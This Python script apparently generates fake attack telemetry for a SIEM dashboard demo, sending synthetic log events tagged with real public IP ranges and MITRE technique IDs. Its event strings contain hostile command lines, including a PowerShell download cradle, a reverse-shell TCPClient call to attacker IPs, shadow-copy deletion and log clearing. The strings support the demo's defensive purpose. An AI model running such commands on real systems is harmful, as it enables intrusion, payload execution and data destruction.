"""
Guardian SIEM - Live Demo Noise Generator
==========================================
Generates continuous realistic attack telemetry using INTERNATIONAL
PUBLIC IPs so the Attack Origin Map lights up on the dashboard.

Usage:
    python generate_noise.py                   # Default: ~2 events/sec
    python generate_noise.py --fast            # Firehose mode: ~10 events/sec
    python generate_noise.py --slow            # Slow drip: 1 event every 2s
    python generate_noise.py --duration 120    # Run for 120 seconds then stop

Run this WHILE the dashboard is open (python guardian_dash.py) to see:
  - Real-time log feed scrolling with attack signatures
  - Severity bars filling with color
  - Critical Alerts counter climbing
  - Attack Origin Map lighting up worldwide
"""

import os
import sys
import random
import time
import argparse
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from event_bus import EventBus

# ============================================================================
# International attacker IPs with real coordinates
# These are PUBLIC IPs that GeoIP services will resolve to map markers.
# Coordinates are hardcoded as fallback so the map works even offline.
# ============================================================================
ATTACKER_PROFILES = [
    # (ip, country_code, country, city, lat, lon)
    ("223.71.167.0",   "CN", "China",         "Beijing",        39.9042,  116.4074),
    ("116.31.116.0",   "CN", "China",         "Guangzhou",      23.1291,  113.2644),
    ("101.36.107.0",   "CN", "China",         "Shenzhen",       22.5431,  114.0579),
    ("5.188.86.0",     "RU", "Russia",        "Moscow",         55.7558,   37.6173),
    ("46.161.27.0",    "RU", "Russia",        "Saint Petersburg",59.9343,  30.3351),
    ("178.62.60.0",    "NL", "Netherlands",   "Amsterdam",      52.3676,   4.9041),
    ("185.220.101.0",  "DE", "Germany",       "Frankfurt",      50.1109,   8.6821),
    ("2.160.0.0",      "DE", "Germany",       "Berlin",         52.5200,  13.4050),
    ("177.126.0.0",    "BR", "Brazil",        "São Paulo",     -23.5505, -46.6333),
    ("45.227.254.0",   "BR", "Brazil",        "Rio de Janeiro", -22.9068, -43.1729),
    ("103.75.201.0",   "IN", "India",         "Mumbai",         19.0760,  72.8777),
    ("14.139.60.0",    "IN", "India",         "New Delhi",      28.6139,  77.2090),
    ("175.45.176.0",   "KP", "North Korea",   "Pyongyang",      39.0392, 125.7625),
    ("5.34.180.0",     "IR", "Iran",          "Tehran",         35.6892,  51.3890),
    ("41.206.0.0",     "NG", "Nigeria",       "Lagos",           6.5244,   3.3792),
    ("156.146.56.0",   "GB", "United Kingdom","London",         51.5074,  -0.1278),
    ("190.2.131.0",    "VE", "Venezuela",     "Caracas",        10.4806, -66.9036),
    ("31.13.80.0",     "UA", "Ukraine",       "Kyiv",           50.4501,  30.5234),
    ("45.33.32.156",   "US", "United States", "Fremont",        37.5485, -121.9886),
    ("104.16.0.0",     "US", "United States", "San Francisco",  37.7749, -122.4194),
]

# Internal target IPs (victims inside the network)
INTERNAL_TARGETS = [
    "10.0.0.1", "10.0.0.5", "10.0.0.10", "10.0.0.20",
    "10.0.0.50", "10.0.1.1", "10.0.1.100", "10.0.2.15",
]

# Active Directory usernames
USERS = [
    "administrator", "admin", "jsmith", "mwilliams", "agarcia",
    "svcaccount", "backup_svc", "sqladmin", "helpdesk", "ceo",
    "cfo", "hr_admin", "it_intern", "domain_admin", "sa",
]

# ============================================================================
# Event Templates — each returns (source, severity, message, enrichment)
# Weighted by how often they should appear in a realistic attack stream
# ============================================================================

def _pick_attacker():
    """Pick a random attacker profile."""
    return random.choice(ATTACKER_PROFILES)


def _pick_target():
    return random.choice(INTERNAL_TARGETS)


def _pick_user():
    return random.choice(USERS)


def evt_failed_login():
    """Event 4625 — Failed logon (brute force traffic)."""
    atk = _pick_attacker()
    user = _pick_user()
    return (
        "Windows_EventLog", "MEDIUM",
        f"Event 4625: Failed logon for {user} from {atk[0]} "
        f"(Logon Type 10, Failure: Bad password, Attempt #{random.randint(1, 50)})",
        {"src_ip": atk[0], "mitre_id": "T1110", "mitre_tactic": "Credential Access",
         "threat_score": random.randint(35, 65),
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_successful_login():
    """Event 4624 — Successful logon after brute force."""
    atk = _pick_attacker()
    user = _pick_user()
    return (
        "Windows_EventLog", "CRITICAL",
        f"Event 4624: Successful logon for {user} from {atk[0]} "
        f"(Logon Type 10 RemoteInteractive) after 23 failed attempts",
        {"src_ip": atk[0], "mitre_id": "T1110", "mitre_tactic": "Credential Access",
         "threat_score": random.randint(85, 99), "rule_matched": "Brute Force - Successful",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_syn_scan():
    """SYN scan from international scanner."""
    atk = _pick_attacker()
    target = _pick_target()
    port = random.choice([22, 80, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443])
    return (
        "Network_IPS", "LOW",
        f"SYN scan detected: {atk[0]} -> {target}:{port} "
        f"(connection attempt, no response)",
        {"src_ip": atk[0], "mitre_id": "T1046", "mitre_tactic": "Discovery",
         "threat_score": random.randint(10, 30),
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_port_scan_summary():
    """Port scan summary — higher severity."""
    atk = _pick_attacker()
    ports = random.randint(20, 200)
    hosts = random.randint(3, 15)
    return (
        "Network_IPS", "MEDIUM",
        f"Port scan summary: {atk[0]} scanned {ports} ports across {hosts} hosts "
        f"in {random.randint(5, 30)} seconds. Open: {_pick_target()}:445, {_pick_target()}:3389",
        {"src_ip": atk[0], "mitre_id": "T1046", "mitre_tactic": "Discovery",
         "threat_score": random.randint(45, 70), "rule_matched": "Port Scan Detection",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_powershell_download():
    """Malicious PowerShell download cradle."""
    atk = _pick_attacker()
    payloads = ["payload.ps1", "beacon.exe", "rev.ps1", "dropper.dll", "update.hta"]
    return (
        "Windows_PowerShell", "CRITICAL",
        f"PowerShell ScriptBlock: IEX(New-Object Net.WebClient).downloadstring("
        f"'http://{atk[0]}/{random.choice(payloads)}') | Invoke-Expression",
        {"src_ip": atk[0], "mitre_id": "T1059.001", "mitre_tactic": "Execution",
         "threat_score": random.randint(88, 99), "rule_matched": "PowerShell Download Cradle",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_encoded_powershell():
    """Base64-encoded PowerShell execution."""
    atk = _pick_attacker()
    return (
        "Windows_Sysmon", "HIGH",
        f"Event ID 1: Process Create. powershell.exe -NoP -NonI -W Hidden "
        f"-Enc SQBFAFgAKABOAGUAdwA= ParentImage: cmd.exe Source: {atk[0]} "
        f"User: CORP\\{_pick_user()}",
        {"src_ip": atk[0], "mitre_id": "T1059.001", "mitre_tactic": "Execution",
         "threat_score": random.randint(80, 95), "rule_matched": "Encoded PowerShell",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_mimikatz():
    """Mimikatz / LSASS credential dumping."""
    atk = _pick_attacker()
    return (
        "Windows_EventLog", "CRITICAL",
        f"Process access to LSASS.exe detected. Source: mimikatz.exe (PID {random.randint(1000,9999)}) "
        f"GrantedAccess: 0x1010. SourceImage: C:\\temp\\mimikatz.exe "
        f"User: CORP\\{_pick_user()} Remote: {atk[0]}",
        {"src_ip": atk[0], "mitre_id": "T1003", "mitre_tactic": "Credential Access",
         "threat_score": random.randint(92, 100), "rule_matched": "Credential Dumping",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_audit_log_cleared():
    """Security audit log cleared — anti-forensics."""
    atk = _pick_attacker()
    return (
        "Windows_EventLog", "CRITICAL",
        f"Event 1102: The audit log was cleared. Subject: CORP\\{_pick_user()} "
        f"LogName: Security. Source: {atk[0]}. Tool: wevtutil.exe",
        {"src_ip": atk[0], "mitre_id": "T1070.001", "mitre_tactic": "Defense Evasion",
         "threat_score": random.randint(90, 100), "rule_matched": "Log Tampering",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_c2_beacon():
    """Outbound C2 communication."""
    atk = _pick_attacker()
    intervals = [60, 120, 300, 600]
    return (
        "Network_IPS", "CRITICAL",
        f"Outbound C2 beacon: {_pick_target()} -> {atk[0]}:443 "
        f"(interval: {random.choice(intervals)}s, jitter: {random.randint(5,20)}%, "
        f"TLS with self-signed cert, AbuseIPDB score: {random.randint(80,100)}%)",
        {"src_ip": atk[0], "mitre_id": "T1071", "mitre_tactic": "Command and Control",
         "threat_score": random.randint(85, 99), "rule_matched": "C2 Beacon Communication",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_data_exfiltration():
    """Large outbound data transfer."""
    atk = _pick_attacker()
    mb = random.randint(200, 2000)
    return (
        "Network_IPS", "HIGH",
        f"Large outbound transfer: {_pick_target()} -> {atk[0]}:443 "
        f"transferred {mb} MB in {random.randint(5,30)} min. "
        f"Normal baseline: 50 MB/day. Protocol: HTTPS",
        {"src_ip": atk[0], "mitre_id": "T1041", "mitre_tactic": "Exfiltration",
         "threat_score": random.randint(75, 95), "rule_matched": "Data Exfiltration",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_ransomware():
    """Ransomware file encryption activity."""
    atk = _pick_attacker()
    files = random.randint(100, 5000)
    return (
        "FileMonitor", "CRITICAL",
        f"Rapid file modification: {files} files renamed to .encrypted "
        f"in C:\\Users\\Public\\ within {random.randint(10,60)}s. "
        f"Process: svchost.exe (PID {random.randint(1000,9999)}). Source: {atk[0]}",
        {"src_ip": atk[0], "mitre_id": "T1486", "mitre_tactic": "Impact",
         "threat_score": random.randint(95, 100), "rule_matched": "Ransomware Activity",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_kerberoasting():
    """Kerberoasting — RC4 service ticket request."""
    atk = _pick_attacker()
    services = ["MSSQLSvc/sql01:1433", "HTTP/web01", "CIFS/file01", "HOST/dc01"]
    return (
        "Windows_EventLog", "HIGH",
        f"Event 4769: Kerberos ticket requested. Account: CORP\\{_pick_user()}. "
        f"Service: {random.choice(services)}. Encryption: 0x17 (RC4-HMAC). "
        f"Source: {atk[0]}",
        {"src_ip": atk[0], "mitre_id": "T1558.003", "mitre_tactic": "Credential Access",
         "threat_score": random.randint(75, 92), "rule_matched": "Kerberoasting Detection",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_rdp_lateral():
    """RDP lateral movement."""
    atk = _pick_attacker()
    user = _pick_user()
    target = _pick_target()
    return (
        "Windows_EventLog", "HIGH",
        f"Event 4624: Logon Type 10 (RDP). Account: CORP\\{user}. "
        f"Source: {atk[0]}. Target: {target}. "
        f"Anomaly: first RDP session from this source.",
        {"src_ip": atk[0], "mitre_id": "T1021.001", "mitre_tactic": "Lateral Movement",
         "threat_score": random.randint(60, 85), "rule_matched": "RDP Lateral Movement",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_dns_exfil():
    """DNS exfiltration via subdomain encoding."""
    atk = _pick_attacker()
    queries = random.randint(500, 5000)
    domains = ["data.evil-domain.com", "exf.c2-server.net", "dns.malware-relay.org"]
    return (
        "Network_IPS", "HIGH",
        f"DNS exfiltration: {_pick_target()} made {queries} queries to "
        f"*.{random.choice(domains)} in {random.randint(5,20)} min. "
        f"Resolver: {atk[0]}. Avg subdomain length: {random.randint(40,63)} chars",
        {"src_ip": atk[0], "mitre_id": "T1048.003", "mitre_tactic": "Exfiltration",
         "threat_score": random.randint(70, 90), "rule_matched": "DNS Exfiltration",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_reverse_shell():
    """Reverse shell establishment."""
    atk = _pick_attacker()
    port = random.choice([4444, 4443, 8443, 9001, 1337])
    return (
        "Windows_Sysmon", "CRITICAL",
        f"Reverse shell: powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient"
        f"('{atk[0]}',{port})\" User: CORP\\{_pick_user()}",
        {"src_ip": atk[0], "mitre_id": "T1059", "mitre_tactic": "Execution",
         "threat_score": random.randint(93, 100), "rule_matched": "Reverse Shell Indicator",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_service_persistence():
    """Malicious service installation."""
    atk = _pick_attacker()
    svc_names = ["WindowsUpdateHelper", "SystemHealthSvc", "WinDefendExt", "SecurityMonitor"]
    return (
        "Windows_EventLog", "HIGH",
        f"Event 7045: Service installed. Name: {random.choice(svc_names)}. "
        f"Binary: C:\\ProgramData\\svchost.exe. Start: auto. Account: LocalSystem. "
        f"Remote source: {atk[0]}",
        {"src_ip": atk[0], "mitre_id": "T1543.003", "mitre_tactic": "Persistence",
         "threat_score": random.randint(72, 88), "rule_matched": "Suspicious Service Installation",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


def evt_shadow_copy_delete():
    """Shadow copy deletion (ransomware precursor)."""
    atk = _pick_attacker()
    return (
        "Windows_EventLog", "CRITICAL",
        f"vssadmin delete shadows /all /quiet executed by CORP\\{_pick_user()}. "
        f"Source: {atk[0]}. Shadow copy deletion prevents recovery.",
        {"src_ip": atk[0], "mitre_id": "T1490", "mitre_tactic": "Impact",
         "threat_score": random.randint(90, 100), "rule_matched": "Shadow Copy Deletion",
         "geo_country": atk[2], "geo_city": atk[3],
         "geo_lat": atk[4], "geo_lon": atk[5]},
    )


# ============================================================================
# Event weights — controls the traffic mix for a realistic demo
# More failed logins and scans (common), fewer ransomware events (rare)
# ============================================================================
EVENT_GENERATORS = [
    (evt_failed_login,        30),   # Most common — brute force noise
    (evt_syn_scan,            25),   # Port scanning background
    (evt_successful_login,     4),   # Occasional breach
    (evt_port_scan_summary,    5),   # Scan summaries
    (evt_powershell_download,  4),   # Download cradle
    (evt_encoded_powershell,   4),   # Encoded PS
    (evt_mimikatz,             3),   # Credential dump
    (evt_audit_log_cleared,    3),   # Log clearing
    (evt_c2_beacon,            5),   # C2 callbacks
    (evt_data_exfiltration,    3),   # Exfil
    (evt_ransomware,           2),   # Ransomware (rare, dramatic)
    (evt_kerberoasting,        3),   # AD attack
    (evt_rdp_lateral,          3),   # Lateral movement
    (evt_dns_exfil,            2),   # DNS tunneling
    (evt_reverse_shell,        2),   # Reverse shell
    (evt_service_persistence,  2),   # Service install
    (evt_shadow_copy_delete,   1),   # Shadow copy (very rare)
]

# Build weighted list
_WEIGHTED_GENERATORS = []
for gen, weight in EVENT_GENERATORS:
    _WEIGHTED_GENERATORS.extend([gen] * weight)


def generate_event():
    """Generate a single random event from the weighted pool."""
    generator = random.choice(_WEIGHTED_GENERATORS)
    return generator()


def main():
    parser = argparse.ArgumentParser(
        description="Guardian SIEM - Live Demo Noise Generator (lights up the map!)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python generate_noise.py               # Normal speed (~2 events/sec)
  python generate_noise.py --fast        # Firehose (~10 events/sec)
  python generate_noise.py --slow        # Slow drip (1 event every 2s)
  python generate_noise.py --duration 60 # Run for 60 seconds

Pro tip: Run this in a second terminal while the dashboard is open:
  Terminal 1:  python guardian_dash.py
  Terminal 2:  python generate_noise.py --fast
        """
    )
    parser.add_argument("--fast", action="store_true", help="Firehose mode (~10 events/sec)")
    parser.add_argument("--slow", action="store_true", help="Slow drip (1 event every 2 sec)")
    parser.add_argument("--delay", type=float, default=None, help="Custom delay between events (seconds)")
    parser.add_argument("--duration", type=int, default=0, help="Stop after N seconds (0 = run forever)")
    parser.add_argument("--count", type=int, default=0, help="Stop after N events (0 = run forever)")

    args = parser.parse_args()

    # Determine delay
    if args.delay is not None:
        delay = args.delay
    elif args.fast:
        delay = 0.1
    elif args.slow:
        delay = 2.0
    else:
        delay = 0.5

    bus = EventBus()
    start_time = time.time()
    event_count = 0

    severity_colors = {
        "LOW": "\033[90m",      # Gray
        "MEDIUM": "\033[93m",   # Yellow
        "HIGH": "\033[33m",     # Orange
        "CRITICAL": "\033[91m", # Red
    }
    reset = "\033[0m"

    print()
    print("=" * 65)
    print("  Guardian SIEM - Live Demo Noise Generator")
    print("  Generating attack telemetry from 20 international IPs")
    print(f"  Speed: {'FIREHOSE' if args.fast else 'SLOW DRIP' if args.slow else 'NORMAL'} "
          f"(~{1/delay:.0f} events/sec)")
    if args.duration:
        print(f"  Duration: {args.duration} seconds")
    if args.count:
        print(f"  Max events: {args.count}")
    print("  Press Ctrl+C to stop")
    print("=" * 65)
    print()

    try:
        while True:
            # Check stop conditions
            if args.duration and (time.time() - start_time) >= args.duration:
                break
            if args.count and event_count >= args.count:
                break

            source, severity, message, enrichment = generate_event()
            bus.emit(source, severity, message, enrichment=enrichment)
            event_count += 1

            # Pretty console output
            color = severity_colors.get(severity, "")
            ip = enrichment.get("src_ip", "?")
            country = enrichment.get("geo_country", "?")
            rule = enrichment.get("rule_matched", "")

            tag = f"[{rule}] " if rule else ""
            print(f"  {color}[{severity:8s}]{reset} {source:20s} {tag}"
                  f"{message[:80]}...")
            print(f"           └─ {ip} ({country})")

            time.sleep(delay)

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start_time
    print()
    print("=" * 65)
    print(f"  NOISE GENERATION COMPLETE")
    print(f"  Events emitted: {event_count}")
    print(f"  Duration:       {elapsed:.1f}s")
    print(f"  Rate:           {event_count/elapsed:.1f} events/sec" if elapsed > 0 else "")
    print(f"  Unique IPs:     {len(ATTACKER_PROFILES)} international sources")
    print("=" * 65)


if __name__ == "__main__":
    main()
